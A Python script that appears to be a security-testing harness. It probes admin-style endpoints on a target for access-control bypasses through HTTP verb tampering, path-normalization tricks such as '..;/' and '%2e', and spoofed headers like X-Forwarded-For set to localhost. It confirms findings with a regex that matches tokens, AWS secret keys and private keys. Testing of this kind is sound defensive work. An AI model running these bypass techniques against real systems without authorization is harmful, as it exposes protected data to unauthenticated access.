#!/usr/bin/env python3
r"""authbypass_harness.py - access-control bypass detector (black-box, anonymous).

Pre-auth class. Given a resource that is correctly GATED to an anonymous client (401/403 or
a login redirect), it runs the standard access-control bypass battery and asks one
deterministic question: did a trick make the server hand real GATED SECRET content to an
unauthenticated requester? Candidate gated paths come from a built-in admin-ish wordlist,
the crawl, and NABLUS_SEEDS.

Confirm oracle (low-FP by construction):
  * baseline anon GET must be GATED (401/403 or 3xx->login/signin/auth).
  * a bypass is CONFIRMED only if a variant returns 200 whose body carries a SECRET signature
    (token / credential / flag) that the gated baseline withheld. A 200 without secret content,
    a login shell, or an already-open resource is never a finding.
Techniques (read-only, no data written): verb tampering, path normalization, and the classic
edge/proxy header ACL bypass (X-Forwarded-For/X-Original-URL/... = localhost or the gated path).
"""
from __future__ import annotations  # noqa
import os, re, json, time, http.cookiejar, urllib.request, urllib.parse, urllib.error, pathlib
from urllib.parse import urljoin, urlsplit, urlunsplit
from html.parser import HTMLParser

BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
OUT = r"C:\Users\Laith\nabulus-agent\authbypass_findings.json"
SEEDS = [s.strip() for s in os.environ.get("NABLUS_SEEDS", "").split(",") if s.strip()]
PACE = 0.02

GATED_PATHS = ["/admin", "/admin/", "/admin/metrics", "/admin/dashboard", "/internal",
               "/internal/", "/metrics", "/debug", "/manage", "/management", "/console",
               "/actuator", "/actuator/env", "/private", "/api/admin", "/api/admin/export",
               "/api/internal", "/api/metrics", "/api/flag", "/api/debug"]
VERBS = ["HEAD", "OPTIONS", "POST", "PUT", "PATCH", "TRACE"]
# header ACL-bypass surface: IP-trust headers -> localhost; URL-rewrite/Referer -> the gated path
IP_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Client-IP",
              "True-Client-IP", "Client-IP", "X-Custom-IP-Authorization", "X-Forwarded-Host"]
URL_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL"]
LOCALHOST = "127.0.0.1"
SECRET_RE = re.compile(
    r"(nwtok_[A-Za-z0-9]{6,}|FLAG-[A-Z]+-|api_token|password_hash|SECRET_KEY|"
    r"AWS_SECRET_ACCESS_KEY|BEGIN (?:RSA |EC )?PRIVATE KEY)")


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def do(method, url, headers=None):
    if PACE:
        time.sleep(PACE)
    op = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()), _NoRedirect())
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    try:
        r = op.open(req, timeout=10)
        return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read(120000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, \
            (e.read(120000).decode("utf-8", "replace") if e.fp else "")
    except Exception:
        return 0, {}, ""


def _login_redirect(status, hdrs):
    loc = (hdrs.get("location") or "").lower()
    return 300 <= status < 400 and any(x in loc for x in ("login", "signin", "auth", "unlock"))


def is_gated(status, hdrs):
    return status in (401, 403) or _login_redirect(status, hdrs)


def _plain_get(url):
    op = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    try:
        r = op.open(urllib.request.Request(url), timeout=10)
        return r.read(120000).decode("utf-8", "replace")
    except Exception:
        return ""


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        for k in ("href", "action"):
            if a.get(k):
                self.hrefs.append(a[k])


def candidates():
    paths, seen, frontier = set(GATED_PATHS), set(), [BASE + "/"]
    for _ in range(2):
        nxt = []
        for u in frontier:
            if u in seen or len(seen) >= 15:
                continue
            seen.add(u)
            for h in _Links_feed(_plain_get(u)):
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen and "logout" not in link.lower():
                    nxt.append(link)
                    paths.add(urlsplit(link).path)
        frontier = nxt
    for s in SEEDS:
        paths.add(urlsplit(s if "://" in s else BASE + ("" if s.startswith("/") else "/") + s).path)
    return sorted(p for p in paths if p)


def _Links_feed(body):
    p = _Links()
    try:
        p.feed(body)
    except Exception:
        pass
    return p.hrefs


def path_variants(path):
    base = path.rstrip("/")
    cands = [base + "/.", base + "//", path + "/./", base + "/%2e/", base + "..;/",
             path + ";", path + ".json", base + "%20",
             path.upper() if path.lower() != path.upper() else path + "/"]
    return list(dict.fromkeys(cands))


def confirm(path):
    url = BASE + path
    st, hdrs, _body = do("GET", url)
    if not is_gated(st, hdrs):
        return None                                   # not gated -> not a bypass finding
    baseline = {"status": st}
    # verb tampering
    for v in VERBS:
        s2, _h2, b2 = do(v, url)
        if s2 == 200 and SECRET_RE.search(b2):
            return {"technique": "verb", "detail": v, "status": s2,
                    "proof_request": f"{v} {url}", "baseline": baseline}
    # path normalization
    for np in path_variants(path):
        nu = urlunsplit(urlsplit(BASE)._replace(path=np))
        s2, _h2, b2 = do("GET", nu)
        if s2 == 200 and SECRET_RE.search(b2):
            return {"technique": "path", "detail": np, "status": s2,
                    "proof_request": f"GET {nu}", "baseline": baseline}
    # header ACL bypass: IP-trust headers -> localhost
    for hdr in IP_HEADERS:
        s2, _h2, b2 = do("GET", url, {hdr: LOCALHOST})
        if s2 == 200 and SECRET_RE.search(b2):
            return {"technique": "header", "detail": f"{hdr}: {LOCALHOST}", "status": s2,
                    "proof_request": f"GET {url}  ({hdr}: {LOCALHOST})", "baseline": baseline}
    # header ACL bypass: URL-rewrite / Referer -> the gated path
    for hdr in URL_HEADERS:
        s2, _h2, b2 = do("GET", BASE + "/", {hdr: path})
        if s2 == 200 and SECRET_RE.search(b2):
            return {"technique": "header", "detail": f"{hdr}: {path}", "status": s2,
                    "proof_request": f"GET {BASE}/  ({hdr}: {path})", "baseline": baseline}
    return None


def main():
    cands = candidates()
    findings, tested = [], set()
    print(f"target: {BASE} | gated-path candidates: {len(cands)}")
    for path in cands:
        if path in tested:
            continue
        tested.add(path)
        proof = confirm(path)
        if proof:
            findings.append({"class": "auth-bypass", "severity": "high", "endpoint": BASE + path,
                             "param": None, "identity": "anon", "proof": proof,
                             "proof_request": proof["proof_request"],
                             "validated_by": (f"gated ({proof['baseline']['status']}) -> anon bypass "
                                              f"via {proof['technique']}:{proof['detail']} returned secret content"),
                             "confirmed": True})
            print(f"[authbypass] CONFIRMED: {path}  [{proof['technique']}:{proof['detail']}] "
                  f"baseline={proof['baseline']['status']} -> 200")
    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[authbypass] confirmed auth-bypass findings: {len(findings)} -> {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
